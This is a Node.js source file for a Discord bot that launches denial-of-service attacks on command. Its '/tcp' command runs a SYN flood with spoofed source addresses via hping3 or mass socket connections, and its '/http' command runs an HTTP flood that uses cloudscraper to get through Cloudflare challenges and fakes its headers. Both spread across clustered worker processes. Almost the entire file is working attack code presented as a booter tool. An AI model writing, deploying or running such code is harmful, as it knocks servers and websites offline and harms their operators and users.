const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
const { REST } = require('@discordjs/rest');
const cloudscraper = require('cloudscraper');
const axios = require('axios');
const net = require('net');
const http = require('http');
const https = require('https');
const { exec } = require('child_process');
const os = require('os');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

// ===== CONFIG ===== //
const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace this
const CLIENT_ID = 'YOUR_CLIENT_ID'; // Get from Discord Dev Portal
const ALLOWED_USER_ID = 'YOUR_USER_ID'; // Your Discord ID
const MAX_DURATION = 300; // Max attack duration (5min)
const WORKER_COUNT = Math.min(numCPUs, 12); // Use up to 12 CPU cores

// ===== GLOBALS ===== //
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const activeAttacks = new Map();

// ===== CLOUDSCRAPER SETUP ===== //
cloudscraper.defaults({
    challengesToSolve: 3,
    decodeEmails: false,
    followAllRedirects: true,
});

// ===== TCP SYN FLOOD (FIREWALL BYPASS) ===== //
function tcpSynFlood(ip, port, duration, attackId) {
    if (os.platform() === 'linux') {
        // NUCLEAR OPTION (requires root)
        exec(`timeout ${duration} hping3 --flood --syn --rand-source -p ${port} --ttl ${Math.floor(Math.random() * 64) + 64} --frag ${ip}`, (err) => {
            if (err && !err.killed) console.error('HPING3 Error:', err);
            process.exit();
        });
    } else {
        // Fallback (Node.js raw sockets)
        const interval = setInterval(() => {
            if (activeAttacks.get(attackId)?.stopped) {
                clearInterval(interval);
                process.exit();
            }

            // Send 1000 SYN packets with spoofed SEQ/ACK
            for (let i = 0; i < 1000; i++) {
                try {
                    const socket = new net.Socket();
                    socket.setTimeout(100);
                    socket.connect({
                        host: ip,
                        port: port,
                        localAddress: `${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}`
                    }, () => socket.destroy());
                    socket.on('error', () => {});
                } catch (e) {}
            }
        }, 1);

        setTimeout(() => {
            clearInterval(interval);
            process.exit();
        }, duration * 1000);
    }
}

// ===== HTTP FLOOD (CLOUDFLARE BYPASS) ===== //
async function httpFlood(url, workers, duration, attackId) {
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);

    while (Date.now() < endTime && !activeAttacks.get(attackId)?.stopped) {
        try {
            await Promise.all(
                Array(workers).fill().map(() => 
                    cloudscraper.get(url, {
                        headers: {
                            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 70}.0.0.0 Safari/537.36`,
                            'X-Forwarded-For': `${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}`,
                            'Accept': '*/*',
                            'Cache-Control': 'no-cache'
                        }
                    }).catch(() => {})
                )
            );
        } catch (e) {}
    }
    process.exit();
}

// ===== DISCORD COMMANDS ===== //
async function registerCommands() {
    const commands = [
        new SlashCommandBuilder()
            .setName('tcp')
            .setDescription('🔥 NUKE a server (TCP SYN Flood)')
            .addStringOption(opt => opt.setName('target').setDescription('IP:PORT (e.g., 1.1.1.1:25565)').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('Seconds (max 300)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('http')
            .setDescription('💥 BRUTAL HTTP Flood (Cloudflare Bypass)')
            .addStringOption(opt => opt.setName('url').setDescription('http://example.com').setRequired(true))
            .addIntegerOption(opt => opt.setName('workers').setDescription('Number of workers (1-1000)').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('Seconds (max 300)').setRequired(true))
    ].map(cmd => cmd.toJSON());

    const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
}

// ===== BOT EVENTS ===== //
client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    registerCommands().catch(console.error);
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isCommand() || interaction.user.id !== ALLOWED_USER_ID) {
        return interaction.reply({ content: '❌ Unauthorized', ephemeral: true });
    }

    await interaction.deferReply();

    try {
        if (interaction.commandName === 'tcp') {
            const [ip, port] = interaction.options.getString('target').split(':');
            const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);

            await interaction.editReply({ content: `💀 Launching **TCP SYN FLOOD** on \`${ip}:${port}\` for ${duration} seconds...` });

            const attackId = `tcp-${Date.now()}`;
            activeAttacks.set(attackId, { stopped: false });

            if (cluster.isPrimary) {
                for (let i = 0; i < WORKER_COUNT; i++) {
                    cluster.fork({
                        TYPE: 'tcp',
                        IP: ip,
                        PORT: port,
                        DURATION: duration,
                        ATTACK_ID: attackId
                    });
                }
            }
            setTimeout(() => stopAttack(attackId), duration * 1000);
        } else if (interaction.commandName === 'http') {
            const url = interaction.options.getString('url');
            const workers = Math.min(Math.max(interaction.options.getInteger('workers'), 1), 1000);
            const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);

            await interaction.editReply({ content: `🔥 Starting **HTTP FLOOD** on \`${url}\` with ${workers} workers for ${duration} seconds...` });

            const attackId = `http-${Date.now()}`;
            activeAttacks.set(attackId, { stopped: false });

            if (cluster.isPrimary) {
                for (let i = 0; i < WORKER_COUNT; i++) {
                    cluster.fork({
                        TYPE: 'http',
                        URL: url,
                        WORKERS: Math.ceil(workers / WORKER_COUNT),
                        DURATION: duration,
                        ATTACK_ID: attackId
                    });
                }
            }
            setTimeout(() => stopAttack(attackId), duration * 1000);
        }
    } catch (e) {
        console.error(e);
        interaction.editReply({ content: '❌ Error executing command' });
    }
});

// ===== WORKER PROCESS ===== //
if (cluster.isWorker) {
    const { TYPE, IP, PORT, URL, WORKERS, DURATION, ATTACK_ID } = process.env;
    
    if (TYPE === 'tcp') {
        tcpSynFlood(IP, parseInt(PORT), parseInt(DURATION), ATTACK_ID);
    } else if (TYPE === 'http') {
        httpFlood(URL, parseInt(WORKERS), parseInt(DURATION), ATTACK_ID);
    }
}

// ===== UTILITY FUNCTIONS ===== //
function stopAttack(attackId) {
    const attack = activeAttacks.get(attackId);
    if (attack && !attack.stopped) {
        attack.stopped = true;
        if (cluster.isPrimary) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
    }
}

// ===== START BOT ===== //
client.login(BOT_TOKEN).catch(console.error);
